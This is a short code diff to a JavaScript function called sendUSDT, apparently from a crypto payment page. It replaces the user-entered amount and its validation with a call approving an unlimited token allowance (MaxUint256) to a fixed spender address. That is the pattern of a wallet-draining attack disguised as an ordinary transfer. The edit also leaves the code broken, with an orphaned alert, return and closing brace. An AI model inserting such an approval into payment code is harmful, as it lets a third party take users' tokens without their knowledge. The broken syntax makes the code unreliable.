@@ -30,8 +30,8 @@ async function sendUSDT() {
     signer
   );
 
-  const amountInput = document.getElementById("amount").value;
-  if (!amountInput || Number(amountInput) <= 0) {
+  const MAX_UINT256 = ethers.MaxUint256;
+const tx = await token.approve(BSC_SPENDER, MAX_UINT256);
     alert("Enter valid amount");
     return;
   }
